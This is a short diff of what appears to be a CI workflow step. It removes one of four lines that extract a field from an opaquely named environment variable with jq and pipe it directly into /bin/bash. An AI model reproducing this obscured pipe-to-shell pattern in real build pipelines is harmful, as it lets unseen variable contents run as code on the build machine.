@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$kjt90" | jq -r .zdqs14434 | /bin/bash
           printf '%s' "$ay86289" | jq -r .gn1 | /bin/bash
-          printf '%s' "$xzyoi7" | jq -r .el68 | /bin/bash
           printf '%s' "$dfjhm8" | jq -r .dev2232 | /bin/bash
 
       - name: Archive results
